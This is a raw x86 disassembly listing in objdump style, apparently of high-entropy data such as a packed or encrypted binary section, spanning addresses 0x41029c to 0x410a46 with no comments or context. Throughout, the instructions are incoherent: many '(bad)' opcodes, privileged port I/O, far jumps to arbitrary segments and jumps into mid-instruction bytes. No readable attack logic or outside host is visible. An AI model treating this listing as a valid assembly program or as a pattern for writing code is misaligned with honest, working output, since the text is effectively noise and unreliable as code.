  41029c:	jmp    0x4102f4
  41029e:	push   es
  41029f:	and    dh,0x3b
  4102a2:	les    esi,FWORD PTR [ebx]
  4102a4:	jmp    0x410292
  4102a6:	std    
  4102a7:	nop
  4102a8:	dec    ebp
  4102a9:	dec    ebx
  4102aa:	mov    edx,0x799a9d9b
  4102af:	push   ds
  4102b0:	aaa    
  4102b1:	test   al,0xfa
  4102b3:	fnstsw WORD PTR [esi-0x325d1a7f]
  4102b9:	and    al,0x82
  4102bb:	inc    esp
  4102bc:	int3   
  4102bd:	test   eax,0x7b1d4657
  4102c2:	daa    
  4102c3:	in     eax,dx
  4102c4:	fild   QWORD PTR [ebp+0x40]
  4102c7:	es inc ebp
  4102c9:	pop    ebp
  4102ca:	test   BYTE PTR [ecx],0x2a
  4102cd:	cld    
  4102ce:	adc    DWORD PTR [ecx],edx
  4102d0:	stos   DWORD PTR es:[edi],eax
  4102d1:	ror    ah,cl
  4102d3:	pop    edx
  4102d4:	idiv   BYTE PTR [eax]
  4102d6:	sbb    al,BYTE PTR [edi+0x15]
  4102d9:	test   eax,0xf1747c65
  4102de:	or     eax,0x21dee84e
  4102e3:	jno    0x4102f6
  4102e5:	inc    esi
  4102e6:	mov    dh,al
  4102e8:	adc    eax,DWORD PTR ds:[ecx+0x1d]
  4102ec:	mov    edx,0x472d615b
  4102f1:	sub    DWORD PTR [edx-0xf],ebp
  4102f4:	iret   
  4102f5:	mov    eax,ds:0x1a4023f2
  4102fa:	lods   al,BYTE PTR ds:[esi]
  4102fb:	cwde   
  4102fc:	mov    ecx,0x941e0e35
  410301:	jp     0x4102b1
  410303:	les    edi,FWORD PTR [edi+ebx*2]
  410306:	xor    al,0xd6
  410308:	add    DWORD PTR [ebx],eax
  41030a:	(bad)  
  41030c:	icebp  
  41030d:	in     al,0x5f
  41030f:	ins    BYTE PTR es:[edi],dx
  410310:	loope  0x410328
  410312:	bound  edi,QWORD PTR [edi-0x70426ff]
  410318:	rcl    BYTE PTR [edi-0x41],cl
  41031b:	add    al,0x9c
  41031d:	scas   al,BYTE PTR es:[edi]
  41031e:	mov    al,ds:0x9bfefd3b
  410323:	icebp  
  410324:	mov    bh,0xad
  410326:	pop    esi
  410327:	jg     0x4102bf
  410329:	mov    dh,0x4f
  41032b:	or     BYTE PTR [ebx],al
  41032d:	rol    BYTE PTR [edi+0x5b],1
  410330:	ret    0xed01
  410333:	xor    edx,edi
  410335:	lds    eax,FWORD PTR [ecx-0x5299b7c]
  41033b:	sub    cl,BYTE PTR [ebp-0x3d]
  41033e:	or     eax,0x72f67155
  410343:	sub    eax,eax
  410345:	jmp    DWORD PTR [esi]
  410347:	inc    ebp
  410348:	out    0x46,al
  41034a:	cmp    eax,ecx
  41034c:	js     0x4103bc
  41034e:	cmp    BYTE PTR [ebx+0x39d369e7],dl
  410354:	test   al,0xd
  410356:	ins    DWORD PTR es:[edi],dx
  410357:	push   es
  410358:	cmp    al,0xd1
  41035a:	lds    ecx,FWORD PTR [esi]
  41035c:	mov    dh,0x7a
  41035e:	sar    edx,1
  410360:	int3   
  410361:	retf   0xfff
  410364:	xchg   ebx,eax
  410365:	push   ecx
  410366:	jge    0x4103e0
  410368:	sbb    bh,BYTE PTR [ecx+edi*4]
  41036b:	add    ecx,DWORD PTR [eax+eiz*8]
  41036e:	aad    0x50
  410370:	add    al,BYTE PTR [edx-0x7d]
  410373:	ds dec eax
  410376:	in     al,dx
  410377:	pop    esi
  410378:	xchg   ecx,eax
  410379:	addr16 cdq 
  41037b:	adc    bh,BYTE PTR [esi+0x7c5fd5d1]
  410381:	mov    dl,0x22
  410383:	sbb    esp,esi
  410385:	into   
  410386:	xchg   edx,eax
  410387:	lock fcmovu st,st(4)
  41038a:	inc    eax
  41038b:	stos   DWORD PTR es:[edi],eax
  41038c:	mov    bl,0x3
  41038e:	pop    es
  41038f:	loope  0x4103fe
  410391:	mov    ebp,0xec51d20d
  410396:	aaa    
  410397:	es push ecx
  410399:	fisub  DWORD PTR [edi-0x7e3f4ebd]
  41039f:	sub    BYTE PTR [edx+0x4ce7a688],cl
  4103a5:	xor    eax,0xf6120542
  4103aa:	bound  edx,QWORD PTR [ecx-0x182c4907]
  4103b0:	lea    edi,[esi+0x5a]
  4103b3:	iret   
  4103b4:	stos   BYTE PTR es:[edi],al
  4103b5:	imul   eax,DWORD PTR [edx-0x44],0x3e
  4103b9:	xchg   ebp,eax
  4103ba:	xchg   esi,eax
  4103bb:	and    DWORD PTR [esi],edx
  4103bd:	inc    ebx
  4103be:	cmp    bh,bl
  4103c0:	push   esi
  4103c1:	js     0x410392
  4103c3:	sub    al,0xd2
  4103c5:	sub    eax,0x4cd3cf07
  4103ca:	add    eax,0x8fe38205
  4103cf:	in     eax,0xec
  4103d1:	cld    
  4103d2:	test   BYTE PTR [esi+0x56],bh
  4103d5:	jmp    0x22cc:0x4640b6c4
  4103dc:	out    0x1,al
  4103de:	in     eax,0x28
  4103e0:	lea    ebp,[ebx-0x52]
  4103e3:	push   es
  4103e4:	fisub  DWORD PTR [esi+0x53]
  4103e7:	or     esp,esi
  4103e9:	call   0x366e6831
  4103ee:	push   0xffffffc4
  4103f0:	pushf  
  4103f1:	les    esp,FWORD PTR [ebp+0x58685c85]
  4103f7:	in     eax,0x3f
  4103f9:	push   ebx
  4103fa:	lods   al,BYTE PTR ds:[esi]
  4103fb:	inc    ebp
  4103fc:	aam    0x6a
  4103fe:	test   eax,0xce0bd9d5
  410403:	repz cdq 
  410405:	mov    ebp,0xd7820dd3
  41040a:	xchg   ecx,eax
  41040b:	ret    0xfc29
  41040e:	jbe    0x410442
  410410:	les    ebp,FWORD PTR [ebx-0x58]
  410413:	pop    eax
  410414:	popa   
  410415:	mov    ebx,DWORD PTR [ebp+0x5a17a28d]
  41041b:	sub    ch,BYTE PTR [esi+0x1b]
  41041e:	lea    esp,[edi+0x2]
  410421:	loope  0x410460
  410423:	mov    BYTE PTR [edi],al
  410425:	fdivr  st,st(1)
  410427:	adc    al,0xd7
  410429:	push   ebp
  41042a:	pop    edx
  41042b:	out    0xce,al
  41042d:	adc    ecx,DWORD PTR [ebp-0x5563ac09]
  410433:	(bad)  
  410434:	mov    ecx,0x35fe5b37
  410439:	jg     0x41044b
  41043b:	lods   al,BYTE PTR ds:[esi]
  41043c:	dec    eax
  41043d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41043e:	jne    0x4103d7
  410440:	and    dl,ah
  410442:	push   ebx
  410443:	aas    
  410444:	imul   edi,DWORD PTR [ecx-0x23],0x66
  410448:	push   ebx
  410449:	and    al,0x1d
  41044b:	repnz add esp,DWORD PTR ds:[esp+ebp*8-0x7ce908c9]
  410454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410455:	inc    ebx
  410456:	mov    ds:0xc069b80e,eax
  41045b:	jne    0x410400
  41045d:	fwait
  41045e:	pop    eax
  41045f:	stc    
  410460:	fs fwait
  410462:	stos   BYTE PTR es:[edi],al
  410463:	xchg   esp,eax
  410464:	push   edi
  410465:	in     eax,0x19
  410467:	mov    ds,WORD PTR [edx]
  410469:	mov    bl,0x1
  41046b:	inc    esp
  41046c:	popf   
  41046d:	xor    al,0xa
  41046f:	xor    DWORD PTR [ebp+esi*2-0x6f8c6884],edx
  410476:	jmp    0x410493
  410478:	dec    edx
  410479:	shl    ebp,cl
  41047b:	and    al,0x64
  41047d:	inc    ecx
  41047e:	inc    edi
  41047f:	(bad)  
  410480:	call   0x7f34:0xd1708e02
  410487:	mov    al,0x67
  410489:	in     al,0x9c
  41048b:	(bad)  
  41048c:	das    
  41048d:	shl    BYTE PTR [eax],cl
  41048f:	xchg   ebx,eax
  410490:	xor    esi,DWORD PTR [esp+edx*2+0x57dc7da8]
  410497:	xor    ebp,DWORD PTR [ecx]
  410499:	xchg   edx,eax
  41049a:	xchg   ecx,eax
  41049b:	mov    cl,0x1a
  41049d:	or     al,0x4d
  41049f:	mov    bl,0xfb
  4104a1:	imul   ebx,DWORD PTR [ecx],0xf3df728d
  4104a7:	jle    0x410521
  4104a9:	mov    edx,esp
  4104ab:	ret    
  4104ac:	cwde   
  4104ad:	and    al,0xf9
  4104af:	test   eax,0x6f475184
  4104b4:	(bad)  
  4104b5:	mov    eax,esp
  4104b7:	loopne 0x410509
  4104b9:	jl     0x410459
  4104bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104bc:	jmp    0x2e3f258c
  4104c1:	pop    eax
  4104c2:	xor    eax,DWORD PTR [eax-0x32564009]
  4104c8:	dec    esp
  4104c9:	aaa    
  4104ca:	xchg   edi,eax
  4104cb:	call   DWORD PTR [edx-0xb]
  4104ce:	iret   
  4104cf:	test   al,0x4b
  4104d1:	inc    ebx
  4104d2:	or     DWORD PTR [esi],esp
  4104d4:	gs pop edx
  4104d6:	ss push 0xc
  4104d9:	rol    ecx,1
  4104db:	dec    ecx
  4104dc:	or     eax,0xd7d7c3aa
  4104e1:	xchg   esi,eax
  4104e2:	jns    0x4104eb
  4104e4:	xchg   ebx,eax
  4104e5:	inc    edi
  4104e6:	mov    DWORD PTR [edx+0x3aee94e1],ecx
  4104ec:	cld    
  4104ed:	sub    eax,0xac0cf5d3
  4104f2:	pop    ebx
  4104f3:	fdivp  st(4),st
  4104f5:	fstp   TBYTE PTR [edx-0x3d]
  4104f8:	retf   0x912
  4104fb:	push   ebp
  4104fc:	jno    0x410486
  4104fe:	stos   BYTE PTR es:[edi],al
  4104ff:	add    edi,DWORD PTR [ecx-0x72f2f072]
  410505:	pop    ebx
  410506:	cmp    ebp,DWORD PTR [eax+0x4f0e10bf]
  41050c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41050d:	jnp    0x4104a6
  41050f:	fidiv  DWORD PTR [ebp-0x48]
  410512:	stos   BYTE PTR es:[edi],al
  410513:	test   al,0xf9
  410515:	and    DWORD PTR [edx],ebp
  410517:	aad    0xd8
  410519:	ret    
  41051a:	outs   dx,BYTE PTR ds:[esi]
  41051b:	xor    cl,BYTE PTR [ebp+0x53f0d4f3]
  410521:	icebp  
  410522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410523:	neg    eax
  410525:	scas   al,BYTE PTR es:[edi]
  410526:	xchg   edx,eax
  410527:	adc    eax,0x679569b6
  41052c:	cs fdiv st(6),st
  41052f:	mov    gs,WORD PTR [eax+0x386ef579]
  410535:	xchg   ecx,eax
  410536:	cmp    al,0x64
  410538:	out    dx,al
  410539:	sub    esi,DWORD PTR [ecx]
  41053b:	pushf  
  41053c:	pop    ebp
  41053d:	adc    eax,0xb95fbc81
  410542:	jmp    FWORD PTR [esi-0x4c]
  410545:	sti    
  410546:	dec    ebp
  410547:	icebp  
  410548:	sub    al,0xe7
  41054a:	out    dx,al
  41054b:	sub    BYTE PTR [esi-0x4e],ah
  41054e:	or     al,0x6d
  410550:	in     al,0x47
  410552:	dec    eax
  410553:	xchg   ecx,eax
  410554:	mov    ch,0x57
  410556:	xchg   esi,eax
  410557:	cwde   
  410558:	into   
  410559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41055a:	push   es
  41055b:	arpl   WORD PTR [ebp+0x46],si
  41055e:	cmp    al,0xd4
  410560:	jcxz   0x410517
  410563:	xchg   edi,eax
  410564:	gs jb  0x410594
  410567:	call   esp
  410569:	push   esp
  41056a:	add    eax,0x784de003
  41056f:	shr    DWORD PTR [eax-0xc],cl
  410572:	sub    eax,0x2c793d94
  410577:	xor    al,0x5b
  410579:	sub    BYTE PTR [ebx+0x58],dl
  41057c:	ja     0x4105ab
  41057e:	adc    eax,0x57b1e8e7
  410583:	(bad)  
  410585:	clc    
  410586:	mov    bh,0x15
  410588:	xlat   BYTE PTR ds:[ebx]
  410589:	fmul   st,st(1)
  41058b:	dec    esp
  41058c:	shl    cl,cl
  41058e:	mov    cl,0xbf
  410590:	std    
  410591:	gs fdiv st,st(0)
  410594:	sbb    bl,BYTE PTR [edx+0x55]
  410597:	sub    ch,BYTE PTR [ecx]
  410599:	repz into 
  41059b:	out    dx,al
  41059c:	cmp    eax,DWORD PTR [ebx-0x2b]
  41059f:	add    al,0x98
  4105a1:	cmp    bl,BYTE PTR [edx]
  4105a3:	popf   
  4105a4:	into   
  4105a5:	test   al,0x24
  4105a7:	adc    ebp,DWORD PTR [ebx]
  4105a9:	fiadd  WORD PTR [eax+0x412828a]
  4105af:	sub    al,0x14
  4105b1:	(bad)  
  4105b2:	clc    
  4105b3:	jle    0x4105c2
  4105b5:	add    dl,BYTE PTR [ebp-0x5fadb9ae]
  4105bb:	add    ebp,DWORD PTR [ebp+0x28]
  4105be:	inc    eax
  4105bf:	adc    DWORD PTR [edx+ebx*8-0x26],0xfffffff6
  4105c4:	sahf   
  4105c5:	sub    ecx,DWORD PTR [ebx-0x43a55f89]
  4105cb:	test   DWORD PTR [ebp+0x7240e178],esi
  4105d1:	ffree  st(1)
  4105d3:	fsub   DWORD PTR [edx+ebp*8-0x9f55fe8]
  4105da:	or     eax,0xc0709d86
  4105df:	xchg   esi,eax
  4105e0:	sub    BYTE PTR [edx-0x36],0x68
  4105e4:	fsubr  QWORD PTR [esi-0x52]
  4105e7:	jmp    0x13333c4b
  4105ec:	dec    ebp
  4105ed:	out    0x3,al
  4105ef:	mov    ecx,0xe39c4977
  4105f4:	test   eax,0xebb65146
  4105f9:	and    DWORD PTR [ebx+0x42e7ac8d],0x224dfe5d
  410603:	dec    eax
  410604:	pop    ebx
  410605:	cld    
  410606:	inc    esi
  410607:	lods   eax,DWORD PTR ds:[esi]
  410608:	hlt    
  410609:	push   ds
  41060a:	xor    eax,0x5be53540
  41060f:	inc    esi
  410610:	adc    edx,DWORD PTR [esi]
  410612:	pop    ecx
  410613:	je     0x41064d
  410615:	inc    eax
  410616:	xchg   edi,eax
  410617:	cmc    
  410618:	jne    0x41068c
  41061a:	loop   0x41067c
  41061c:	loopne 0x410690
  41061e:	dec    ebx
  41061f:	lahf   
  410620:	fwait
  410621:	pop    ds
  410622:	mov    cl,BYTE PTR [esi-0x4]
  410625:	mov    edi,0xa2f198ee
  41062a:	aad    0x79
  41062c:	imul   edi,DWORD PTR ds:0x21946cdf,0xffffffed
  410633:	inc    ebp
  410634:	sub    DWORD PTR [edi+0x18f83d50],ebp
  41063a:	add    BYTE PTR [eax],0x78
  41063d:	dec    ecx
  41063e:	mov    edx,0x170f39b
  410643:	(bad)  
  410644:	xchg   ecx,eax
  410645:	add    esi,edi
  410647:	(bad)  
  410648:	adc    al,0x88
  41064a:	loope  0x4105e2
  41064c:	aam    0xb4
  41064e:	cwde   
  41064f:	retf   0x5579
  410652:	repnz (bad) 
  410654:	mov    dh,0x46
  410656:	push   esi
  410657:	push   esp
  410658:	add    eax,0xb089f766
  41065d:	stos   DWORD PTR es:[edi],eax
  41065e:	sub    eax,0xab8f7be7
  410663:	sbb    ch,BYTE PTR [ebx+0x21caa93a]
  410669:	mov    bl,0xbb
  41066b:	sub    eax,0xf17e7ce4
  410670:	stos   BYTE PTR es:[edi],al
  410671:	jmp    0xf65635be
  410676:	aam    0x20
  410678:	pop    ds
  410679:	sahf   
  41067a:	xchg   ebx,eax
  41067b:	cmp    ah,cl
  41067d:	mov    esp,edi
  41067f:	test   DWORD PTR [eax+0x3b],ecx
  410682:	repz push edi
  410684:	dec    ebp
  410685:	and    eax,0x7d87ae53
  41068a:	lahf   
  41068b:	and    DWORD PTR [esi+ebx*4+0x31a2ec8b],ebx
  410692:	xchg   ebp,eax
  410693:	pop    esi
  410694:	mov    ebp,0xae868e6d
  410699:	push   ebx
  41069a:	inc    ecx
  41069b:	push   edx
  41069c:	jmp    0x41063a
  41069e:	das    
  41069f:	sar    DWORD PTR ss:[ebx-0x30866b83],1
  4106a6:	jmp    0x31ab:0x96b12bc4
  4106ad:	push   0xea9bdae6
  4106b2:	fneni(8087 only) 
  4106b4:	mov    ecx,0x23c8415d
  4106b9:	clc    
  4106ba:	xor    al,0x3d
  4106bc:	mov    esi,0xfd9c379f
  4106c1:	add    bl,BYTE PTR [esi-0x69b1f83f]
  4106c7:	mov    ah,0xaa
  4106c9:	xor    ebp,0x2f95cd98
  4106cf:	and    eax,0x168be6e8
  4106d4:	(bad)  
  4106d5:	mov    edx,0x95377aaf
  4106da:	in     eax,dx
  4106db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106dc:	cld    
  4106dd:	iret   
  4106de:	or     eax,0x21d51d25
  4106e3:	sub    al,0xd1
  4106e5:	(bad)  
  4106e6:	mov    ds,WORD PTR [ebp-0x7c]
  4106e9:	mov    dh,BYTE PTR [ecx+0x196c9edc]
  4106ef:	push   eax
  4106f0:	std    
  4106f1:	inc    eax
  4106f2:	adc    edi,0xb1d37365
  4106f8:	sbb    BYTE PTR [edi+0x544ad23e],0x7a
  4106ff:	mov    ah,0x54
  410701:	sub    BYTE PTR [esi+0x3bdbfe5d],al
  410707:	jb     0x41068e
  410709:	inc    ecx
  41070a:	jecxz  0x4106ba
  41070c:	xchg   edi,eax
  41070d:	sub    eax,0x7b5b9358
  410712:	adc    al,0x46
  410714:	xchg   esi,eax
  410715:	cmp    ecx,esi
  410717:	repz (bad) 
  410719:	mov    edx,0xd57261f9
  41071e:	and    DWORD PTR [edx-0x35],esi
  410721:	xor    ebp,edi
  410723:	pop    es
  410724:	add    BYTE PTR [ebx+eax*1+0x11bf6abd],al
  41072b:	aas    
  41072c:	adc    al,0xaa
  41072e:	inc    esp
  41072f:	daa    
  410730:	lea    eax,[edi+edx*8-0x1b]
  410734:	ins    DWORD PTR es:[edi],dx
  410735:	and    BYTE PTR [eax+0x58274306],0xe
  41073c:	inc    edi
  41073d:	sub    BYTE PTR [ebx+ebx*4+0x3f93c53f],ah
  410744:	jno    0x4107be
  410746:	push   esi
  410747:	dec    eax
  410748:	mov    DWORD PTR [edx+eiz*4-0x3aebf4a3],esp
  41074f:	leave  
  410750:	push   ebp
  410751:	push   ss
  410752:	neg    DWORD PTR [eax]
  410754:	sbb    BYTE PTR [edi+0x5e],0x72
  410758:	or     eax,0x1ce0ff7
  41075d:	in     al,0xc6
  41075f:	stos   BYTE PTR es:[edi],al
  410760:	jmp    0xcb54e340
  410765:	jo     0x4107b7
  410767:	sbb    DWORD PTR ds:0x5f732906,edi
  41076d:	sbb    al,0xca
  41076f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410770:	pop    eax
  410771:	lock xor BYTE PTR [ebp-0x16d49fc8],ch
  410778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410779:	ret    
  41077a:	mov    ebp,0x7958a686
  41077f:	jp     0x410793
  410781:	jge    0x410759
  410783:	dec    ebp
  410784:	sbb    DWORD PTR [ebx],ebx
  410786:	jle    0x4107fe
  410788:	xor    al,0x6
  41078a:	xlat   BYTE PTR ds:[ebx]
  41078b:	mov    ds:0xb6db2a67,al
  410790:	scas   al,BYTE PTR es:[edi]
  410791:	mov    ds:0x92a92b28,al
  410796:	pushf  
  410797:	ja     0x41074c
  410799:	in     eax,dx
  41079a:	xchg   esp,eax
  41079b:	mov    ds:0xa824e8fd,eax
  4107a0:	adc    al,0xe5
  4107a2:	call   0xca0cdab8
  4107a7:	int    0x53
  4107a9:	add    esp,edi
  4107ab:	jg     0x410737
  4107ad:	iret   
  4107ae:	inc    ecx
  4107af:	sar    DWORD PTR [esi],1
  4107b1:	pop    esi
  4107b2:	xor    ah,BYTE PTR [ecx+0x7a50d4cd]
  4107b8:	fadd   DWORD PTR [esi]
  4107ba:	jo     0x410790
  4107bc:	pop    eax
  4107bd:	lock sbb dl,ch
  4107c0:	push   0x63acfa27
  4107c5:	int3   
  4107c6:	push   ss
  4107c7:	enter  0xf529,0xf7
  4107cb:	out    0xe7,eax
  4107cd:	cmp    eax,0xdd4bc78e
  4107d2:	mov    BYTE PTR [edi+edx*4],ah
  4107d5:	mov    bh,0xee
  4107d7:	out    0xdd,al
  4107d9:	es push ebx
  4107db:	sbb    bh,BYTE PTR [edi+0x74]
  4107de:	cmc    
  4107df:	mov    esi,0x887f40df
  4107e4:	sti    
  4107e5:	arpl   WORD PTR ds:0x66c56a,cx
  4107eb:	adc    eax,0x1b86aa63
  4107f0:	adc    esi,DWORD PTR [ebp+0x7ea4164a]
  4107f6:	pop    esp
  4107f7:	(bad)  
  4107f8:	stos   BYTE PTR es:[edi],al
  4107f9:	and    eax,0xd8cce2db
  4107fe:	icebp  
  4107ff:	aas    
  410800:	lods   eax,DWORD PTR ds:[esi]
  410801:	and    eax,0xdb8e97a3
  410806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410807:	aad    0x5
  410809:	in     eax,0x8b
  41080b:	enter  0x5693,0x54
  41080f:	lods   al,BYTE PTR ds:[esi]
  410810:	add    ebx,ebx
  410812:	dec    edi
  410813:	lods   eax,DWORD PTR ds:[esi]
  410814:	ret    
  410815:	mov    ch,0x81
  410817:	add    eax,0x2774848a
  41081c:	pop    esi
  41081d:	cwde   
  41081e:	pop    esp
  41081f:	sub    BYTE PTR [ecx-0x77],bh
  410822:	xchg   esi,eax
  410823:	mov    ds:0x81a9a097,eax
  410828:	iret   
  410829:	(bad)  
  41082a:	sbb    dh,BYTE PTR [edi+0x17816196]
  410830:	mov    bh,0x70
  410832:	fiadd  DWORD PTR [ebx-0x5cc236f8]
  410838:	ror    BYTE PTR [ecx+0x7c],1
  41083b:	xchg   edi,eax
  41083c:	add    bl,BYTE PTR [ecx]
  41083e:	adc    bl,BYTE PTR [esi+0x1d]
  410841:	lock xor ebp,DWORD PTR [ecx+0x1e]
  410845:	aas    
  410846:	jg     0x4108b8
  410848:	fcomp  QWORD PTR [eax+ecx*8-0xed15f33]
  41084f:	fsubr  st(7),st
  410851:	push   ecx
  410852:	sub    dl,ah
  410854:	and    ch,BYTE PTR [ecx-0x54]
  410857:	jb     0x4108cc
  410859:	adc    BYTE PTR [ebp-0x23481520],ch
  41085f:	(bad)
  410862:	out    0xb9,al
  410864:	mov    esp,0xf168a89a
  410869:	lahf   
  41086a:	sub    al,0xd6
  41086c:	ins    DWORD PTR es:[edi],dx
  41086d:	loop   0x410880
  41086f:	or     bh,dl
  410871:	sahf   
  410872:	mov    bh,0x6c
  410874:	add    al,0xea
  410876:	retf   
  410877:	outs   dx,DWORD PTR ds:[esi]
  410878:	not    DWORD PTR [eax+0x2d]
  41087b:	cmp    BYTE PTR [ecx],al
  41087d:	int3   
  41087e:	mov    cs,ecx
  410880:	inc    edx
  410881:	jbe    0x410830
  410883:	push   edx
  410884:	xor    BYTE PTR [ebx+0x9403e1],dh
  41088a:	push   0xab06fba1
  41088f:	call   0x86c6:0x2d111e3f
  410896:	cwde   
  410897:	jge    0x410910
  410899:	fisttp DWORD PTR [ebp-0x388c25f5]
  41089f:	mov    cl,0xea
  4108a1:	sar    BYTE PTR [esp+ebx*1],1
  4108a4:	stos   DWORD PTR es:[edi],eax
  4108a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108a6:	inc    esp
  4108a7:	inc    ebp
  4108a8:	push   esi
  4108a9:	dec    eax
  4108aa:	sub    DWORD PTR [edi+0x3c],esp
  4108ad:	cmp    BYTE PTR [ecx-0x6485801e],bl
  4108b3:	js     0x4108d5
  4108b5:	xor    BYTE PTR [eax],ah
  4108b7:	inc    esp
  4108b8:	(bad)  
  4108ba:	jl     0x4108d4
  4108bc:	leave  
  4108bd:	xor    DWORD PTR [edx-0x1],edx
  4108c0:	call   0xb0dded83
  4108c5:	jmp    0x4b8a3db
  4108ca:	inc    ebx
  4108cb:	stos   BYTE PTR es:[edi],al
  4108cc:	leave  
  4108cd:	cli    
  4108ce:	(bad)  
  4108d0:	jnp    0x4108bd
  4108d2:	sbb    edi,edx
  4108d4:	xchg   esp,eax
  4108d5:	fwait
  4108d6:	sbb    bl,BYTE PTR [ecx-0x18bdfc6a]
  4108dc:	(bad)  
  4108dd:	shr    BYTE PTR [edx+0x196ba4ca],0x1b
  4108e4:	push   esi
  4108e5:	fwait
  4108e6:	imul   ebx,DWORD PTR [esi],0x2990b812
  4108ec:	mov    eax,0x3ba62a14
  4108f1:	xchg   edx,eax
  4108f2:	xchg   edx,eax
  4108f3:	or     BYTE PTR [edi-0x462f94ca],ch
  4108f9:	pop    ss
  4108fa:	mov    eax,ds:0x794f7532
  4108ff:	and    eax,0xfd9ea81c
  410904:	stos   DWORD PTR es:[edi],eax
  410905:	mov    esp,0x93b8391d
  41090a:	imul   edx,DWORD PTR [ecx+0x267debf9],0xcd11ca28
  410914:	jns    0x410902
  410916:	dec    esp
  410917:	in     al,0xe9
  410919:	mov    ah,0x2
  41091b:	mul    DWORD PTR [esi+0x7ef8e200]
  410921:	sub    al,0x93
  410923:	push   ebx
  410924:	lahf   
  410925:	sbb    dh,dh
  410927:	pop    esp
  410928:	mov    cl,cl
  41092a:	pop    eax
  41092b:	or     bl,BYTE PTR [ebp+0x34]
  41092e:	mov    ah,0xab
  410930:	in     eax,0x21
  410932:	xchg   esp,eax
  410933:	and    eax,0x9a3fc721
  410938:	daa    
  410939:	sti    
  41093a:	pushfw 
  41093c:	pop    ds
  41093d:	gs jmp 0xf96909cc
  410943:	xor    BYTE PTR [ecx],al
  410945:	push   ds
  410946:	xchg   ebx,eax
  410947:	out    dx,al
  410948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410949:	es dec esi
  41094b:	cmp    al,0xf0
  41094d:	mov    dh,0xbd
  41094f:	repnz inc esi
  410951:	outs   dx,DWORD PTR ds:[esi]
  410952:	fwait
  410953:	adc    ecx,DWORD PTR [edi-0x41]
  410956:	ret    0x4cb0
  410959:	in     eax,0x78
  41095b:	(bad)  
  41095c:	cmp    edx,DWORD PTR [edi+0x19]
  41095f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410960:	and    al,0x5
  410962:	les    edx,FWORD PTR [edx+0x54]
  410965:	push   cs
  410966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410967:	dec    ebx
  410968:	xchg   edi,eax
  410969:	xchg   edx,eax
  41096a:	popf   
  41096b:	mul    DWORD PTR [ebp+0x1ac0664a]
  410971:	xor    eax,0x5e8d85c8
  410976:	dec    eax
  410977:	mov    eax,0x7ce428ad
  41097c:	rcr    BYTE PTR [edi-0x3d],1
  41097f:	mov    DWORD PTR [esi-0x1f],edi
  410982:	mov    cs,WORD PTR [edx]
  410984:	push   esp
  410985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410986:	and    ebp,ebp
  410988:	mov    ebx,0x32ff2951
  41098d:	stos   BYTE PTR es:[edi],al
  41098e:	lds    edi,FWORD PTR [eax-0x74a9d196]
  410994:	mov    WORD PTR [edx],cs
  410996:	aaa    
  410997:	aaa    
  410998:	add    al,0x82
  41099a:	mov    ah,0xfe
  41099c:	scas   eax,DWORD PTR es:[edi]
  41099d:	out    0xd6,eax
  41099f:	retf   
  4109a0:	retf   0x58c
  4109a3:	sbb    DWORD PTR [ecx],esi
  4109a5:	xchg   ebp,eax
  4109a6:	call   0xfb138068
  4109ab:	out    0x78,eax
  4109ad:	scas   eax,DWORD PTR es:[edi]
  4109ae:	in     al,dx
  4109af:	jbe    0x41098f
  4109b1:	clc    
  4109b2:	add    ebp,ebp
  4109b4:	scas   eax,DWORD PTR es:[edi]
  4109b5:	in     eax,0xee
  4109b7:	push   cs
  4109b8:	out    dx,eax
  4109b9:	mov    dh,0xcb
  4109bb:	push   edx
  4109bc:	and    ch,BYTE PTR [eax+0x4b]
  4109bf:	mov    ecx,0xb1a851e6
  4109c4:	push   edx
  4109c5:	mov    BYTE PTR [ebx-0x543ab2bf],dl
  4109cb:	loopne 0x41099b
  4109cd:	inc    edx
  4109ce:	jmp    0x77b3:0x8249c90d
  4109d5:	in     eax,0x2d
  4109d7:	sbb    eax,0xf9b9f945
  4109dc:	bound  edi,QWORD PTR [ebx+0x44]
  4109df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e0:	inc    edx
  4109e1:	jle    0x4109e7
  4109e3:	or     al,0x34
  4109e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109e6:	sbb    ebp,DWORD PTR [eax]
  4109e8:	xchg   ecx,eax
  4109e9:	lahf   
  4109ea:	ret    0xb82
  4109ed:	shl    DWORD PTR [edi],0x66
  4109f0:	aaa    
  4109f1:	inc    eax
  4109f2:	sub    DWORD PTR [edi+0x34835c5e],esi
  4109f8:	cli    
  4109f9:	jg     0x4109b5
  4109fb:	pop    ecx
  4109fc:	jae    0x410a32
  4109fe:	outs   dx,BYTE PTR ds:[esi]
  4109ff:	out    0x35,eax
  410a01:	into   
  410a02:	sahf   
  410a03:	mov    cl,bl
  410a05:	sbb    dh,BYTE PTR [ecx-0x566c5a45]
  410a0b:	and    al,0x1e
  410a0d:	js     0x410a7b
  410a0f:	xchg   BYTE PTR ds:0x3f042fd7,dh
  410a15:	ficomp WORD PTR [ebx]
  410a17:	or     eax,0x227e4ff8
  410a1c:	aaa    
  410a1d:	cdq    
  410a1e:	pop    ss
  410a1f:	mov    ebx,0x2bb72ead
  410a24:	push   ss
  410a25:	dec    esi
  410a26:	mov    esi,0xbea4dfee
  410a2b:	or     eax,0x8849a9f4
  410a30:	pop    ss
  410a31:	in     eax,dx
  410a32:	int3   
  410a33:	sub    ebp,ecx
  410a35:	not    BYTE PTR [esp+esi*2+0x72a6b696]
  410a3c:	pop    ecx
  410a3d:	or     BYTE PTR [edx-0x5f],0xc5
  410a41:	int3   
  410a42:	retf   
  410a43:	pusha  
  410a44:	out    0xea,al
  410a46:	imul   esi,DWORD PTR [ecx],0xffffffa2
